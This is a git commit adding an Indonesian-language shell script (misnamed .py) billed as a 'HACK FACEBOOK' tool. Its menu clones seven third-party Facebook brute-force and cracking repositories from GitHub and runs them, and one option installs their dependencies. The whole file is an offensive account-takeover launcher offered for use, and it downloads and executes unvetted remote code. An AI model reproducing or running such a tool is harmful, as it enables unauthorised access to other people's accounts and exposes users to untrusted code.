b8606e348d10fcf240d5169517e0f9dce3c897d9
V1NL0L <51802965+V1NL0L@users.noreply.github.com>
2019-06-14 04:33:13 +0700

    Add files via upload

---
+++ TERMUXID1.py
@@ -0,0 +1,140 @@
+#usr/bin/bash
+clear
+bi='\033[34;1m' #biru
+i='\033[32;1m' #ijo
+pur='\033[35;1m' #purple
+cy='\033[36;1m' #cyan
+me='\033[31;1m' #merah
+pu='\033[37;1m' #putih
+ku='\033[33;1m' #kuning
+# Jangan Recode Ya gayn
+echo
+echo
+echo
+echo $bi"["$me"•"$bi"]"$me"───────────────────────────────────────────"$bi"["$me"•"$bi"]"
+echo $bi" |"$i"               •HACK FACEBOOK•"$bi"               |"
+echo $bi" |"$me"─────────────────────────────────────────────"$bi"|"
+echo $bi" |"$i" Author    :"$i" V1NL0L"$bi"                          |"
+echo $bi" |"$i" Facebook  :"$i" Vin"$bi"                             |"
+echo $bi" |"$i" WhatsApp  :"$i" 0895379191113"$bi"                   |"
+echo $bi" |"$i" Gmail     :"$i" kevinfaka68@gmail.com"$bi"           |"
+echo $bi"["$me"•"$bi"]"$me"───────────────────────────────────────────"$bi"["$me"•"$bi"]"
+echo
+echo $bi"["$pu" 1"$bi" ]"$i" BRUTEFORCE FB PHP        "$bi
+echo $bi"["$pu" 2"$bi" ]"$i" BRUTEFORCE FB BR1G4D3    "$bi
+echo $bi"["$pu" 3"$bi" ]"$i" BRUTEFORCE FB iqbalz     "$bi
+echo $bi"["$pu" 4"$bi" ]"$i" BRUTEFORCE FB MBF        "$bi
+echo $bi"["$pu" 5"$bi" ]"$i" FACEBRUTE N1ght420       "$bi
+echo $bi"["$pu" 6"$bi" ]"$i" BRUTEFORCE FB ( root )   "$bi
+echo $bi"["$pu" 7"$bi" ]"$i" BRUTEFORCE AUTOMBF       "$bi
+echo $bi"["$pu" 8"$bi" ]"$i" INSTALL BAHAN DULU COEG  "$bi
+echo $bi"["$pu" 9"$bi" ]"$i" KELUAR/EXIT PROGRAM      "$bi
+echo
+echo $i"┌==="$i"["$i"V1NL0L"$i"]"$i"======"$i"["$i"Pilih Nomornya"$i"]"
+echo $i"¦"
+read -p"└──>• " pil
+
+if [ $pil = 1 ]
+then
+clear
+figlet -f slant "W A I T"|lolcat
+sleep 1
+git clone https://github.com/FR13ND8/fbbrute
+cd fbbrute
+php fb.php
+fi
+
+if [ $pil = 2 ]
+then
+clear
+figlet -f slant "W A I T"|lolcat
+sleep 1
+git clone https://github.com/FR13ND8/Fb-Cracker-v.3
+cd Fb-Cracker-v.3
+python2 crack.py
+fi
+
+if [ $pil = 3 ]
+then
+clear
+figlet -f slant "W A I T"|lolcat
+sleep 1
+git clone https://github.com/IqbalzNoobs/fb-brute
+cd fb-brute
+python2 brute.py
+fi
+
+if [ $pil = 4 ]
+then
+clear
+figlet -f slant "W A I T"|lolcat
+sleep 1
+git clone https://github.com/FR13ND8/mbf
+cd mbf
+python2 MBF.py
+fi
+
+if [ $pil = 5 ]
+then
+clear
+figlet -f slant "W A I T"|lolcat
+sleep 1
+git clone https://github.com/N1ght420/FaceBrute
+cd FaceBrute
+python fb.py
+fi
+
+if [ $pil = 6 ]
+then
+clear
+figlet -f slant "W A I T"|lolcat
+sleep 1
+git clone https://github.com/thelinuxchoice/facebash.git
+cd facebash
+bash facebash.sh
+fi
+
+if [ $pil = 7 ]
+then
+figlet -f slant "W A I T"|lolcat
+sleep 1
+git clone https://github.com/hckble/autombf
+cd autombf
+python2 kontol.py
+fi
+
+if [ $pil = 8 ]
+then
+clear
+apt update && apt upgrade
+apt install python2
+pip2 install urllib3 chardet certifi idna requests
+pkg install git
+pip2 install bs4
+pip2 install mechanize
+pkg install curl
+pkg install ruby
+pkg install gem
+gem install lolcat
+pkg install git
+pkg install php
+pkg install ruby cowsay toilet figlet
+pkg install neofetch                                                                      pkg install nano
+figlet -f slant " S U K S E S "|lolcat
+fi
+
+if [ $pil = 9 ]
+then
+clear
+figlet -f slant "E X I T"|lolcat
+sleep 2
+echo $i"Terima Kasih Sudah Pakai Tool Saya"
+sleep 2
+echo $i"Bila Ada Kesalahan Kamu Bisa Nanya Kepada Saya"
+sleep 2
+echo $i"WhatsApp :"$i" 0895379191113"
+echo $i"Facebook :"$i" Vin"
+sleep 2
+echo $i">> Thanks Yang Sudah Support Saya <<"
+exit
+fi
